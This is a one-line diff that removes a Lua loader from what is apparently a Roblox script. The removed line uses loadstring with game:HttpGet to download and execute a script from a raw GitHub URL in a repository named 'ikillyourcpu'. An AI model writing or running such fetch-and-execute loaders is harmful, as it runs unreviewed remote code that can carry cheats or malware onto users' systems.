@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ikillyourcpu/releases/main/11943871352.lua"))();
